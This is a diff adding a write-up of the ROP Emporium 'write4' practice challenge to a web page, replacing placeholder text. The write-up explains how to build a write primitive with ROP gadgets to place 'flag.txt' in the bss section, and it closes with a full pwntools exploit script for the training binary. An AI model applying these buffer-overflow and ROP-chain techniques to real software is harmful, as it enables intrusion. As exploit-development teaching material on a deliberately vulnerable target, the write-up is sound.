@@ -1,14 +1,96 @@
 <div class="page-header">
     <div class="page-header-inner">
         <div class="page-header-inner2">
-            <h1>Rop-Emporium - Write4</h1>
+            <h1>Write4 Writeup</h1>
+            <h2>May 2021</h2>           
+            <h4>Write string into memory and call win function</h4>           
         </div>
     </div>
 </div>
+<H4>Problem</H4>
 <div class="paragraph">
-    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Distinctio excepturi asperiores voluptate quisquam! Temporibus minus esse obcaecati recusandae exercitationem quam adipisci laboriosam veniam, est molestiae reiciendis at, nobis autem soluta?</p>
+    <p>
+        Find and manipulate gadgets to construct an arbitrary write primitive and use it to learn where and how to get your data into process memory.<a href=../../docs/rop_emporium/write4>write4</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally.
+        <br>
+    	This binary is quite similar to the split challenge. It once again has a win function that opens and prints out a file for us, however in this case the name of the file is nowhere to be found in memory. This means that we need to manually write the string "flag.txt" into memory and pass it to the function if we want to retrieve the flag.
+        <br>
+        We start off by confirming where we want to write our string to. In this case I chose the bss section since it is non randomized, and has rw- permission, which means that we can write to the section without causing the binary to crash. The address of this section can be found in pwndbg using the command 'maintenance info sections'.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/write1.png" alt="">
 </div>
 <div class="paragraph">
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Laudantium inventore vel ut, a eum harum. Aliquam est hic maxime, temporibus neque minima optio, quia alias sequi non dolores distinctio dolore?</p>
+    <p>
+        <br><br>
+        Now that we know where we want to write to, we need to figure out how exactly we want to accomplish this task. Using ropper we find three gadgets that we can use to accomplish exactly this. Using the 2 pop gadgets we can set up the rdi & rsi registers. Since we now have control over the rdi and rsi registers, we can use them to write any data of our choice to any location in memory that we chose.
+        <br><br>
+    </p>
 </div>
+<div>
+    <img src="../imgs/rop_emporium/write2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        We now have everything we need to craft our exploit. First we write the string "flag.txt" into memory in the bss section. This has to be done in 2 phases since we can only copy over 4 bytes at a time since our gadget uses edi instead of rdi. Next we use another location in the bss register to point to the location of our flag. Now when we pop this last value into the rdi register and call the win function, its argument points to the string "flag.txt" that we wrote to the bss section. 
+        <br>
+        Running this exploit now prints out the flag. Below you can find our complete commented exploit script.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/write3.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./write4')
+libc = elf.libc
+p = elf.process()
+
+string1 = b"flagAAAA"
+string2 = b".txtAAAA"           #Flag string + filler since edi is used
+
+bss_loc1 = p64(0x601068)        #"Flag" location
+bss_loc2 = p64(0x601068+4)      #".txt" location
+bss_loc3 = p64(0x601068+12)     #Address we use to point to flag location
+pop_rdi = p64(0x400693)         
+pop_rsi_r15 = p64(0x400691)
+mov_edi_to_rsi = p64(0x400629)
+t = b"T"*8
+
+payload = b"A"*40      
+payload += pop_rsi_r15 + bss_loc1 + t + pop_rdi + string1 + mov_edi_to_rsi  #write "flag" to memory
+payload += pop_rsi_r15 + bss_loc2 + t + pop_rdi + string2 + mov_edi_to_rsi  #write ".txt" to memory
+payload += pop_rsi_r15 + bss_loc3 + t + pop_rdi + bss_loc1 + mov_edi_to_rsi #write our flag pointer to memory
+payload += pop_rsi_r15 + bss_loc3 + t + p64(elf.sym.print_file)   #pop pointer into rdi and call win function
+
+p.sendline(payload)
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
